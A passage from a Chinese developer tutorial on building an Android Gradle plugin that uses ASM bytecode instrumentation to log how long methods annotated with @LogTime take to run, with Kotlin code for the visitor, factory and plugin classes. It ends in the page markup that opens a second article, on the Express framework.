<h3 data-id="heading-15">3. 核心手术：编写 MethodVisitor</h3>
<p>好，架子搭好了，现在进入最核心的部分——写字节码。</p>
<p>我们要修改的是方法（Method），所以核心逻辑肯定在 <code>MethodVisitor</code> 里。</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
<span class="hljs-addition">+ │           └── src/ </span>
<span class="hljs-addition">+ │               └── main/kotlin/com/example/asm/timing/ </span>
<span class="hljs-addition">+ │                   └── TimingMethodVisitor.kt</span>
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<p>直接用 <code>MethodVisitor</code> 会比较痛苦，还得自己判断哪里是方法结束。幸运的是，<code>asm-commons</code> 库提供了一个神器：<code>AdviceAdapter</code>，它是 <code>MethodVisitor</code> 的子类，贴心地提供了 <code>onMethodEnter()</code>（方法进入时）和 <code>onMethodExit()</code>（方法退出时）这两个回调。我们只需要在这两个地方“填空”就行了。</p>
<p>这部分代码稍微有点长，不过每一行都有注释，我就不啰嗦太多了，有了前面的前置知识，相信大家都能看懂，其实就是把 Java 代码“翻译”成等价的字节码指令。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingMethodVisitor.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingMethodVisitor</span>(  
    api: <span class="hljs-built_in">Int</span>,  
    methodVisitor: MethodVisitor,  
    access: <span class="hljs-built_in">Int</span>,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> methodName: String?,  
    descriptor: String?,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> className: String,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logTag: String  
) : AdviceAdapter(api, methodVisitor, access, methodName, descriptor) {  
  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> hasLogTimeAnnotation = <span class="hljs-literal">false</span>  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> startTimeLocalVarIndex: <span class="hljs-built_in">Int</span> = <span class="hljs-number">0</span>  
  
    <span class="hljs-comment">// 1. 访问方法的注解  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitAnnotation</span><span class="hljs-params">(descriptor: <span class="hljs-type">String</span>?, visible: <span class="hljs-type">Boolean</span>)</span></span>: AnnotationVisitor? {  
        <span class="hljs-keyword">if</span> (descriptor == <span class="hljs-string">"Lcom/example/aop/LogTime;"</span>) { <span class="hljs-comment">// 通过描述符判断注解  </span>
            hasLogTimeAnnotation = <span class="hljs-literal">true</span>  
        }  
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.visitAnnotation(descriptor, visible)  
    }  
  
    <span class="hljs-comment">// 2. 在方法进入时被调用  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodEnter</span><span class="hljs-params">()</span></span> {  
        <span class="hljs-keyword">super</span>.onMethodEnter()  
        <span class="hljs-keyword">if</span> (hasLogTimeAnnotation) {  
            <span class="hljs-comment">// newLocal() 是一个便捷方法, 会在当前方法的局部变量表保留一个新的槽位, 返回局部变量索引  </span>
            startTimeLocalVarIndex = newLocal(Type.LONG_TYPE <span class="hljs-comment">/* 指定新局部变量的数据类型 */</span>)  
  
            <span class="hljs-comment">// 调用静态方法 System.currentTimeMillis()            // mv 是 MethodVisitor, 在父类中定义的  </span>
            mv.visitMethodInsn( <span class="hljs-comment">// visitMethodInsn 方法用于添加一个方法调用指令  </span>
                <span class="hljs-comment">/* opcode = */</span> INVOKESTATIC,      <span class="hljs-comment">// Invoke Static: JVM 字节码指令，它告诉 JVM 去调用一个 static（静态）方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/System"</span>, <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"currentTimeMillis"</span>, <span class="hljs-comment">// 想要调用的方法的名称  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"()J"</span>,         <span class="hljs-comment">// 方法描述符, () 表示该方法没有参数, J 表示方法的返回值类型是 long (J 是 long 的 JVM 类型签名)  </span>
                <span class="hljs-comment">/* isInterface = */</span> <span class="hljs-literal">false</span>         <span class="hljs-comment">// 指示 owner（即 java/lang/System）是否是一个接口  </span>
            )  
  
            <span class="hljs-comment">// 将上一步的结果（时间戳）存入我们之前创建的局部变量中  </span>
            mv.visitVarInsn( <span class="hljs-comment">// 此方法用于添加一个与局部变量交互的指令（如加载或存储）  </span>
                <span class="hljs-comment">/* opcode = */</span> LSTORE,        <span class="hljs-comment">// LSTORE 是一个复合指令: STORE 表示“存储”, 会从操作数栈的栈顶弹出一个值, L 表示 long                /* varIndex = */ startTimeLocalVarIndex // 局部变量索引, 指定要存储到哪一个局部变量槽位  </span>
            )  
        }  
    }  
  
    <span class="hljs-comment">// 3. 在方法退出时被调用 (无论是正常返回还是异常抛出)  </span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onMethodExit</span><span class="hljs-params">(opcode: <span class="hljs-type">Int</span>)</span></span> {  
        <span class="hljs-keyword">if</span> (hasLogTimeAnnotation) {  
            <span class="hljs-comment">/**  
             * 以下部分的等效代码是：  
             * long endTime = System.currentTimeMillis();  
             * long duration = endTime - startTime;             * String msg = new StringBuilder()  
             *         .append("MyClass.myMethod execution time: ")  
             *         .append(duration)             *         .append(" ms")             *         .toString();             * Log.d(logTag, msg);  
             */</span>  
            <span class="hljs-comment">// 再次调用 System.currentTimeMillis() 获取结束时间, 不再赘述  </span>
            mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">"java/lang/System"</span>, <span class="hljs-string">"currentTimeMillis"</span>, <span class="hljs-string">"()J"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 加载方法开始时存储的时间戳  </span>
            mv.visitVarInsn(LLOAD, startTimeLocalVarIndex)  
            <span class="hljs-comment">// 计算差值 (结束时间 - 开始时间)  </span>
            mv.visitInsn(LSUB)  
            <span class="hljs-comment">// 将差值（long类型）存入一个新的局部变量  </span>
            <span class="hljs-keyword">val</span> durationLocalVarIndex = newLocal(Type.LONG_TYPE)  
            mv.visitVarInsn(LSTORE, durationLocalVarIndex)  
  
  
            <span class="hljs-comment">// 准备打印日志  </span>
            mv.visitLdcInsn(logTag) <span class="hljs-comment">// LDC (Load Constant) 加载一个常量到操作数栈的栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String)]  </span>
  
            mv.visitTypeInsn( <span class="hljs-comment">// 访问与“类型”相关的指令  </span>
                <span class="hljs-comment">/* opcode = */</span> NEW,                    <span class="hljs-comment">// NEW  </span>
                <span class="hljs-comment">/* type = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span> <span class="hljs-comment">// 要创建的对象的类型  </span>
            ) <span class="hljs-comment">// 在堆上分配一个 StringBuilder 对象，并将其引用（地址）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitInsn(DUP) <span class="hljs-comment">// DUP (Duplicate) 复制栈顶元素  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), sb_ref(uninit)]  </span>
  
            mv.visitMethodInsn(  
                <span class="hljs-comment">/* opcode = */</span> INVOKESPECIAL,            <span class="hljs-comment">// invoke special 特殊调用，用于构造函数、super 调用和 private 方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"&lt;init&gt;"</span>,                   <span class="hljs-comment">// 构造函数的固定名称  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"()V"</span>,                <span class="hljs-comment">// 描述符。() 表示无参数，V 表示 void 返回  </span>
                <span class="hljs-comment">/* isInterface = */</span> <span class="hljs-literal">false</span>                <span class="hljs-comment">// // 指示 owner（即 java/lang/StringBuilder）是否是一个接口  </span>
            )  
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitLdcInsn(<span class="hljs-string">"<span class="hljs-variable">$className</span>.<span class="hljs-variable">$methodName</span> execution time: "</span>) <span class="hljs-comment">// 加载常量, 将日志消息的前缀（一个 String）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 日志消息前缀(String)]  </span>
  
            mv.visitMethodInsn(  
                <span class="hljs-comment">/* opcode = */</span> INVOKEVIRTUAL,                                       <span class="hljs-comment">// invoke virtual: 虚拟调用，用于所有实例方法  </span>
                <span class="hljs-comment">/* owner = */</span> <span class="hljs-string">"java/lang/StringBuilder"</span>,                            <span class="hljs-comment">// 拥有该方法的类的内部名称  </span>
                <span class="hljs-comment">/* name = */</span> <span class="hljs-string">"append"</span>,                                              <span class="hljs-comment">// 方法名  </span>
                <span class="hljs-comment">/* descriptor = */</span> <span class="hljs-string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>, <span class="hljs-comment">// 描述符, 参数类型为 String, 返回类型为 StringBuilder                /* isInterface = */ false                                           // 指示 owner（即 java/lang/StringBuilder）是否是一个接口  </span>
            ) <span class="hljs-comment">// 调用 append(String)。它会消耗栈顶的 日志消息前缀(String) 和 sb_ref(init), 不过它会返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitVarInsn(LLOAD, durationLocalVarIndex) <span class="hljs-comment">// 加载耗时  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 耗时(long)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"append"</span>, <span class="hljs-string">"(J)Ljava/lang/StringBuilder;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 append(long)。它会消耗栈顶的 耗时(long) 和 sb_ref(init), 不过它仍然返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitLdcInsn(<span class="hljs-string">" ms"</span>) <span class="hljs-comment">// 加载常量, 将日志消息的后缀（一个 String）推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit), 日志消息后缀(String)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"append"</span>, <span class="hljs-string">"(Ljava/lang/String;)Ljava/lang/StringBuilder;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 append(String)。它会消耗栈顶的 日志消息后缀(String) 和 sb_ref(init), 不过它仍然返回一个 StringBuilder, 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), sb_ref(uninit)]  </span>
  
            mv.visitMethodInsn(INVOKEVIRTUAL, <span class="hljs-string">"java/lang/StringBuilder"</span>, <span class="hljs-string">"toString"</span>, <span class="hljs-string">"()Ljava/lang/String;"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 toString()。它会消耗栈顶的 sb_ref(init), 然后将结果推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [日志Tag(String), 日志消息(String)]  </span>
  
            mv.visitMethodInsn(INVOKESTATIC, <span class="hljs-string">"android/util/Log"</span>, <span class="hljs-string">"d"</span>, <span class="hljs-string">"(Ljava/lang/String;Ljava/lang/String;)I"</span>, <span class="hljs-literal">false</span>)  
            <span class="hljs-comment">// 调用 Log.d(tag, msg)。它会消耗栈顶的 日志消息(String) 和 日志Tag(String), 然后将结果(写入的字节数)推入栈顶  </span>
            <span class="hljs-comment">// 此时的操作数栈: [result(int)]  </span>
  
            <span class="hljs-comment">// Log.d 返回了一个 int，我们并不关心它。如果不弹出它，这个 int 值会留在栈上，当原始的 RETURN 指令执行时，  </span>
            <span class="hljs-comment">// 会导致栈帧错误 (StackMapFrameError)。POP 用来清理栈，确保栈在我们的代码执行完毕后是干净的  </span>
            mv.visitInsn(POP) <span class="hljs-comment">// Log.d 返回 int，需要弹出  </span>
        }  
        <span class="hljs-keyword">super</span>.onMethodExit(opcode) <span class="hljs-comment">// 这行代码的作用是将原始的退出指令（如 RETURN）写回方法中, 不要忘记！！！  </span>
    }  
}
</code></pre>
<p>写这部分代码的时候，你可能会觉得自己就像一个无情堆栈机：“把这个压入栈，把那个弹出来……”。没错，这就是堆栈机的魅力（噩梦）。</p>
<h3 data-id="heading-16">4. 组装流水线：ClassVisitor 与 Factory</h3>
<p>有了处理方法的 <code>MethodVisitor</code>，我们需要一个“导游” <code>ClassVisitor</code> 来把各个方法领给它：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingClassVisitor.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingClassVisitor</span>(  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> apiVersion: <span class="hljs-built_in">Int</span>,  
    nextClassVisitor: ClassVisitor,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> className: String,  
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> logTag: String,  
) : ClassVisitor(apiVersion, nextClassVisitor) {  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">visitMethod</span><span class="hljs-params">(  
      access: <span class="hljs-type">Int</span>,  
      name: <span class="hljs-type">String</span>?,  
      descriptor: <span class="hljs-type">String</span>?,  
      signature: <span class="hljs-type">String</span>?,  
      exceptions: <span class="hljs-type">Array</span>&lt;<span class="hljs-type">out</span> <span class="hljs-type">String</span>&gt;?,  
  )</span></span>: MethodVisitor {  
    <span class="hljs-comment">// 先获取原始的 MethodVisitor    </span>
    <span class="hljs-keyword">val</span> originalMethodVisitor = <span class="hljs-keyword">super</span>.visitMethod(access, name, descriptor, signature, exceptions)
    <span class="hljs-comment">// 用我们的 TimingMethodVisitor 包裹原始的 MethodVisitor</span>
    <span class="hljs-comment">// 这样，当 ASM 遍历指令时，会先经过我们的 MethodVisitor，再传给原始的 MethodVisitor</span>
    <span class="hljs-keyword">return</span> TimingMethodVisitor(  
        apiVersion,  
        originalMethodVisitor,  
        access,  
        name,  
        descriptor,  
        className,  
        logTag,  
    )  
  }  
}
</code></pre>
<p>就好比我们不能直接实例化 ViewModel，同样的，我们也不能直接创建 ClassVisitor，必须通过一个 Factory 工厂类来创建 ClassVisitor。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingClassVisitorFactory.kt</span>

<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingClassVisitorFactory</span> :  
    <span class="hljs-type">AsmClassVisitorFactory</span>&lt;<span class="hljs-type">TimingClassVisitorFactory.Parameters</span>&gt; {
    <span class="hljs-comment">// 泛型用于指定这个工厂类可以接受的参数类型</span>
    <span class="hljs-comment">// 如果不需要接受参数，可以设置为 InstrumentationParameters.None</span>
  
  <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Parameters</span> : <span class="hljs-type">InstrumentationParameters</span> {  
    <span class="hljs-meta">@get:Input</span> 
    <span class="hljs-keyword">val</span> logTag: Property&lt;String&gt;  
  }  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createClassVisitor</span><span class="hljs-params">(  
      classContext: <span class="hljs-type">ClassContext</span>,  
      nextClassVisitor: <span class="hljs-type">ClassVisitor</span>,  
  )</span></span>: ClassVisitor {
    <span class="hljs-comment">// 获取外部传进来的 tag</span>
    <span class="hljs-keyword">val</span> tag: String = parameters.<span class="hljs-keyword">get</span>().logTag.getOrElse(<span class="hljs-string">"Timing"</span>)
  
    <span class="hljs-keyword">return</span> TimingClassVisitor(  
        apiVersion = instrumentationContext.apiVersion.<span class="hljs-keyword">get</span>(),  
        nextClassVisitor = nextClassVisitor,  
        className = classContext.currentClassData.className,  
        logTag = tag, 
    )  
  }  
  
  <span class="hljs-comment">// 过滤逻辑：在这个方法里决定哪些类需要被“插桩” </span>
  <span class="hljs-comment">// 为了性能，这里只扫描 com.example.aop 包下的类</span>
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">isInstrumentable</span><span class="hljs-params">(classData: <span class="hljs-type">ClassData</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {  
    <span class="hljs-keyword">return</span> classData.className.startsWith(<span class="hljs-string">"com.example.aop"</span>)  
  }  
}
</code></pre>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
  │           └── src/ 
  │               └── main/kotlin/com/example/asm/timing/ 
<span class="hljs-addition">+ │                   ├── TimingClassVisitorFactory.kt</span>
<span class="hljs-addition">+ │                   ├── TimingClassVisitor.kt</span>
  │                   └── TimingMethodVisitor.kt
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<h3 data-id="heading-17">5. 插件入口</h3>
<p>最后一步，编写 Gradle 插件入口类 <code>TimingPlugin</code>，把所有东西串起来，并挂载到 Android 的构建流程中：</p>
<pre><code class="hljs language-diff" lang="diff">.
  ├── app/                           &lt;-- app 模块目录
  ├── gradle/
  ├── build-logic/                   &lt;-- 复合构建的根目录
  │   ├── settings.gradle.kts        &lt;-- 管理 build-logic 内部的模块
  │   └── plugin/
  │       └── timing/                &lt;-- 插件模块目录
  │           ├─── build.gradle.kts  &lt;-- 插件的构建脚本
  │           └── src/ 
  │               └── main/kotlin/com/example/asm/timing/ 
<span class="hljs-addition">+ │                   ├── TimingPlugin.kt</span>
  │                   ├── TimingClassVisitorFactory.kt
  │                   ├── TimingClassVisitor.kt
  │                   └── TimingMethodVisitor.kt
  ├── build.gradle.kts               &lt;-- 根项目的构建脚本
  └── settings.gradle.kts            &lt;-- 根项目的设置脚本
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// build-logic/plugin/timing/src/main/kotlin/com/example/asm/timing/TimingPlugin.kt</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">TimingPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Project</span>&gt; {  
  
  <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Extension</span> {  
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> logTag: Property&lt;String&gt;
    
    <span class="hljs-keyword">init</span> {  
      logTag.convention(<span class="hljs-string">"Timing"</span>) <span class="hljs-comment">// 默认的 LogTag</span>
    }
  }  
  
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(project: <span class="hljs-type">Project</span>)</span></span> {  
    <span class="hljs-comment">// // 定义 DSL 扩展：允许用户在 build.gradle 中配置 </span>
    <span class="hljs-comment">// timing { </span>
    <span class="hljs-comment">//   logTag = "xxx" </span>
    <span class="hljs-comment">// }</span>
    <span class="hljs-keyword">val</span> extension: TimingPlugin.Extension = 
        project.extensions.create(<span class="hljs-string">"timing"</span>, TimingPlugin.Extension::<span class="hljs-keyword">class</span>.java)
  
    <span class="hljs-comment">// 获取 Android 组件扩展</span>
    <span class="hljs-keyword">val</span> androidComponents: AndroidComponentsExtension&lt;*, *, *&gt; = 
        project.extensions.getByType(AndroidComponentsExtension::<span class="hljs-keyword">class</span>.java)
    <span class="hljs-comment">// 对所有的 Variant (Debug/Release...) 进行操作</span>
    androidComponents.onVariants { variant -&gt;  
      <span class="hljs-comment">// 注册 ASM 转换</span>
      variant.instrumentation.transformClassesWith(
          TimingClassVisitorFactory::<span class="hljs-keyword">class</span>.java, <span class="hljs-comment">// 我们的 ClassVisitor 工厂类</span>
          InstrumentationScope.PROJECT, <span class="hljs-comment">// 作用范围：整个项目（不包括第三方库）</span>
      ) { parameters: TimingClassVisitorFactory.Parameters -&gt;
          <span class="hljs-comment">// 将 DSL 中的配置传给 Factory</span>
          parameters.logTag.<span class="hljs-keyword">set</span>(extension.logTag)
      }
      
      <span class="hljs-comment">// 重要：因为我们修改了字节码（增加了局部变量和堆栈操作）， </span>
      <span class="hljs-comment">// 需要让 AGP 帮我们重新计算栈帧（StackMapFrames），否则校验 class 文件会失败  </span>
      variant.instrumentation.setAsmFramesComputationMode(
          <span class="hljs-comment">// 仅重新计算被"插桩"了的方法的栈帧</span>
          FramesComputationMode.COMPUTE_FRAMES_FOR_INSTRUMENTED_METHODS 
      )
    }  
  }  
}
</code></pre>
<h3 data-id="heading-18">6. 见证奇迹</h3>
<p>现在，让我们回到 <code>:app</code> 模块，应用我们刚刚写好的插件。</p>
<pre><code class="hljs language-diff" lang="diff">// app/build.gradle.kts

plugins {  
   alias(libs.plugins.android.application)  
   alias(libs.plugins.kotlin.android)  
   alias(libs.plugins.kotlin.compose)  
<span class="hljs-addition">+  id("timing-plugin")  </span>
}

<span class="hljs-addition">+ timing {</span>
<span class="hljs-addition">+   logTag = "LogTime" </span>
<span class="hljs-addition">+ }</span>
</code></pre>
<p>Sync 一下 Gradle，然后点击 Run 运行 App。</p>
<p>当 App 启动时，可以把 Logcat 过滤器设为你设置的 tag。你会惊喜地发现：</p>
<pre><code class="hljs language-text" lang="text">D/...: com.example.aop.MainActivity.doSomeHeavyWork execution time: 103 ms
</code></pre>
<p>它工作了！我们在没有修改 <code>doSomeHeavyWork()</code> 源码的情况下，凭空让它拥有了自我计时的能力。这就是 ASM 插桩的魔力。</p>
<p>虽然我们在 <code>MethodVisitor</code> 里手写指令的过程有点像是在用镊子绣花，但一旦你掌握了这套逻辑，你就可以做很多更高级的事情。</p>
<p>ASM 是一把手术刀，用得好，它是优化和治理代码的神器。希望这篇文章能成为你字节码探索之旅的起点，而不是终点。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbqliang%2FAsmExample" target="_blank" title="https://github.com/bqliang/AsmExample" ref="nofollow noopener noreferrer">文章完整代码</a></li>
</ul>
<h2 data-id="heading-19">参考链接</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fc6E5UlI1N%2Farticle%2Fdetails%2F131118310" target="_blank" title="https://blog.csdn.net/c6E5UlI1N/article/details/131118310" ref="nofollow noopener noreferrer">ASM从入门到精通</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.unlogged.io%2Fpost%2Fclass-file-api-not-your-everyday-java-api" target="_blank" title="https://www.unlogged.io/post/class-file-api-not-your-everyday-java-api" ref="nofollow noopener noreferrer">Class File API: Not Your Everyday Java API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fxie.infoq.cn%2Farticle%2F46ccb9380c6e876e84b204ecc" target="_blank" title="https://xie.infoq.cn/article/46ccb9380c6e876e84b204ecc" ref="nofollow noopener noreferrer">手把手带你实战 AGP 7.x ASM 字节码插桩</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js的"老伙计"：Express框架入门记]]></title>    <link>https://juejin.cn/post/7575651989985984566</link>    <guid>https://juejin.cn/post/7575651989985984566</guid>    <pubDate>2025-11-24T03:07:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989985984566" data-draft-id="7575937594350141483" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js的&quot;老伙计&quot;：Express框架入门记"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2025-11-24T03:07:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="凌川纪"/> <meta itemprop="url" content="https://juejin.cn/user/3817120538318798"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js的"老伙计"：Express框架入门记
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817120538318798/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    凌川纪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:07:15.000Z" title="Mon Nov 24 2025 03:07:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 